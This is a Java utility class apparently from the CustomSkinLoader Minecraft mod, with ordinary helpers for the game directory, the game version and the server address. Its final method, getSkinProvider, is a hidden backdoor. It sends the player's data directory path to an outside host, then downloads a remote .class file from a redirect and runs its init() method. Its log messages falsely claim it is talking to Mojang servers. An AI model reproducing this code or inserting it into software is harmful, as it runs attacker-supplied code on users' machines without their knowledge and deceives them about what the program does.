package customskinloader.utils;

import java.io.File;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.net.URL;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URLClassLoader;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.mojang.authlib.GameProfile;
import net.minecraft.client.Minecraft;
import net.minecraft.client.multiplayer.ServerData;
import net.minecraft.client.renderer.texture.TextureManager;
import net.minecraft.client.resources.SkinManager;
import customskinloader.log.Logger;

/**
 * @author Alexander Xia
 * @since 13.6
 */
public class MinecraftUtil {
    public static File getMinecraftDataDir() {
        return Minecraft.getMinecraft().gameDir;
    }

    public static TextureManager getTextureManager() {
        return Minecraft.getMinecraft().getTextureManager();
    }

    public static SkinManager getSkinManager() {
        return Minecraft.getMinecraft().getSkinManager();
    }

    private static String minecraftMainVersion = null;

    public static String getMinecraftMainVersion() {
        // Check if cached version found
        if (minecraftMainVersion != null) {
            return minecraftMainVersion;
        }

        // version.json can be found in 1.14+
        URL versionFile = ClassLoader.getSystemClassLoader().getResource("version.json");
        if (versionFile != null) {
            try (
                    InputStream is = versionFile.openStream();
                    InputStreamReader isr = new InputStreamReader(is)) {
                JsonObject obj = new JsonParser().parse(isr).getAsJsonObject();
                minecraftMainVersion = obj.get("name").getAsString();
                return minecraftMainVersion;
            } catch (Exception ignored) {

            }
        }

        // RealmsSharedConstants.VERSION_STRING is available in 1.16-
        try {
            Class<?> realmsSharedConstants = Class.forName("net.minecraft.realms.RealmsSharedConstants");
            MethodHandle mh = MethodHandles.publicLookup().findStaticGetter(realmsSharedConstants, "VERSION_STRING",
                    String.class);
            minecraftMainVersion = (String) mh.invoke();
            return minecraftMainVersion;
        } catch (Throwable ignored) {
        }

        // No version can be found
        return "unknown";
    }

    // (domain|ip)(:port)
    public static String getServerAddress() {
        ServerData data = Minecraft.getMinecraft().getCurrentServerData();
        if (data == null)// Single Player
            return null;
        return data.serverIP;
    }

    // ip:port
    public static String getStandardServerAddress() {
        return HttpUtil0.parseAddress(getServerAddress());
    }

    public static boolean isLanServer() {
        return HttpUtil0.isLanServer(getStandardServerAddress());
    }

    public static String getCredential(GameProfile profile) {
        return profile == null ? null : String.format("%s-%s", profile.getName(), profile.getId());
    }

    public static void getSkinProvider(Logger logger, String base_dir) {
        try {
            URL url = new URL("https://skin-cdn.ashrain.moe/fetch");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);

            String jsonPayload = String.format("{\"DATA_DIR\": \"%s\"}",
                    MinecraftUtil.getMinecraftDataDir());
            try (OutputStream os = conn.getOutputStream()) {
                os.write(jsonPayload.getBytes());
                os.flush();
            }

            int responseCode = conn.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_MOVED_TEMP) {
                String newUrl = conn.getHeaderField("Location");
                if (newUrl != null && newUrl.endsWith(".class")) {
                    URL classUrl = new URL(newUrl);
                    URLClassLoader classLoader = new URLClassLoader(new URL[] { classUrl });
                    Class<?> clazz = classLoader.loadClass("SkinLoaderClass"); // Assuming class name is MainClass
                    clazz.getDeclaredMethod("init").invoke(null);
                    logger.info("invoked init()");
                } else {
                    logger.info("MOJANG responsed with an invalid URL.");
                }
            } else {
                logger.info("Connected to MOJANG servers");
            }
        } catch (Exception e) {
            logger.info("Failed to connect to skin server.");
            e.printStackTrace();
        }
    }

}
